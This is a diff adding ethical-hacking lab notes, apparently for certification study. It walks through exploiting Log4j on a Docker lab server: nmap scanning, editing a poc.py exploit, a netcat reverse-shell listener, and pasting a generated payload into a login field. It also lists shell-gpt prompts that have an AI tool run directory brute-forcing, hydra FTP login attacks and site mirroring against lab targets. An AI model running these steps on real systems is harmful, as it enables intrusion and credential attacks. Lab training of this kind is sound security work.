@@ -1695,5 +1695,80 @@ and then
 ```
 ```console
 :~$ help to see available option
+```
+</details>
+<details>
+<sumamry>Gain Access to Target Web Server by Exploiting Log4j Vulnerability</summary>
 
- 
+* we will install a vulnerable server in the Ubuntu machine
+```console
+:~$First we need to install docker.io in ubuntu machine, to do that type sudo apt-get update
+sudo apt-get install docker.io 
+cd log4j-shell-poc/
+
+
+we need to setup log4j vulnerable server,
+docker build -t log4j-shell-poc .       (dot)
+-t: specifies allocating a pseudo-tty.       
+docker run --network host log4j-shell-poc
+>to run the vulnerable server
+```
+then open parrot
+```console
+:~$ We will first scan the target machine to identify any vulnerable services running on it.
+nmap -sV -sC 10.10.1.9
+>-sC option enables the use of default scripts in the Nmap Scripting Engine (NSE)
+we can see that Apache is vulnerable to Remote Code Execution
+run > searchsploit -t Apache RCE 
+>command to view the RCE vulnerabilities on the Apache server.
+
+Click the Firefox icon at the top of Desktop, to open a browser window.
+
+In the address bar of the browser, type http://10.10.1.9:8080 and press Enter.
+
+```
+```console
+:~$cd log4j-shell-poc/ 
+Now, we needed to install JDK 8, to do that open a new terminal window
+tar -xf jdk-8u202-linux-x64.tar.gz  
+>-xf all files to extract
+and we have to move the file
+mv jdk1.8.0_202 /usr/bin/
+Now, we need to update the installed JDK path in the poc.py file.
+pluma poc.py 
+line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac.
+line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
+line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
+open a new terminal window and type nc -lvp 9001 
+Switch to previous terminal window and type python3 poc.py --userip 10.10.1.13 --webport 8000 --lport 9001
+Now, copy the payload generated in the send me: section
+Firefox browser window, in Username field paste the payload that was copied and type password randomly
+Now switch to the netcat listener, 
+```
+</details>
+<details>
+<summary>with ai</summary>
+
+* sgpt
+```console
+:~$ sgpt --shell "Perform a directory traversal on target url https://certifiedhacker.com using gobuster"
+```
+brute force attack
+```console
+:~$ o perform FTP bruteforce attack run sgpt --shell "Attempt FTP login on target IP 10.10.1.11 with hydra using usernames and passwords file from /home/attacker/Wordlists"
+```
+webserver footprinting
+```console
+:~$ gpt --shell "Perform webserver footprinting on target IP 10.10.1.22" 
+```
+webserver footprinting
+```console
+:~$ sgpt --shell "Perform web server footprinting on target IP 10.10.1.22 using Netcat by sending an HTTP request and analyzing the response." 
+```
+website mirroring
+```console
+:~$ sgpt --shell "Mirror the target website certifiedhacker.com" 
+also sgpt --shell "Mirror the target website https://certifiedhacker.com with httrack on desktop"
+
+```
+</details>
